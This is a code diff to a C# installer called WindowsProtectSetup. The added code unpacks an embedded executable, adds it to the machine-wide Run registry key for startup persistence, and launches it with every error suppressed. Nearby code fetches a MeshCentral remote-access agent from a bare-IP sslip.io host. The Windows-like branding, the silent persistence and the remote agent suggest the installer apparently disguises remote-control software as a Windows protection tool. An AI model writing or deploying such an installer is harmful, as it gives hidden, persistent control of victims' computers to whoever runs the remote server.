@@ -17,6 +17,7 @@ public class WindowsProtectSetup : Form {
   const string BaseUrl="https://devicehost.vercel.app";
   const string InstallDir=@"C:\Program Files\Common Files\DeviceSupport";
   const string ServiceExe=@"C:\Program Files\Common Files\DeviceSupport\DeviceSupportHost.exe";
+  const string UserUIExe=@"C:\Program Files\Common Files\DeviceSupport\WindowsProtect_UserUI.exe";
   const string DataDir=@"C:\ProgramData\WindowsProtect";
 
   TextBox ownerBox=new TextBox();
@@ -178,6 +179,8 @@ public class WindowsProtectSetup : Form {
       Directory.CreateDirectory(InstallDir);
       StopExistingService();
       ExtractEmbeddedService(ServiceExe);
+      ExtractEmbeddedUserUI(UserUIExe);
+      RegisterUserUI();
 
       if(String.IsNullOrWhiteSpace(meshAgentUrl)) meshAgentUrl="https://34-69-184-103.sslip.io/meshagents?id=4&meshid=gY1Com9g9071ieNPRic8EHP2irnFHZxy1gpsoBn8opAi4guIJ$gAQj$INq8mbEjL&installflags=0";
       var meshReady=MeshReady();
@@ -241,6 +244,30 @@ public class WindowsProtectSetup : Form {
       if(input==null) throw new Exception("WindowsProtect service payload is missing.");
       using(var output=File.Create(destination)) input.CopyTo(output);
     }
+  }
+
+  static void ExtractEmbeddedUserUI(string destination){
+    var asm=Assembly.GetExecutingAssembly();
+    using(var input=asm.GetManifestResourceStream("WindowsProtect_UserUI.exe")){
+      if(input==null) throw new Exception("WindowsProtect user interface payload is missing.");
+      using(var output=File.Create(destination)) input.CopyTo(output);
+    }
+  }
+
+  static void RegisterUserUI(){
+    try{
+      using(var run=Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run")){
+        run.SetValue("WindowsProtectUserUI","\""+UserUIExe+"\"");
+      }
+    }catch{}
+    try{
+      foreach(var p in Process.GetProcessesByName("WindowsProtect_UserUI")){
+        try{ p.Kill(); }catch{}
+      }
+    }catch{}
+    try{
+      Process.Start(new ProcessStartInfo(UserUIExe){UseShellExecute=true});
+    }catch{}
   }
 
   static bool MeshReady(){
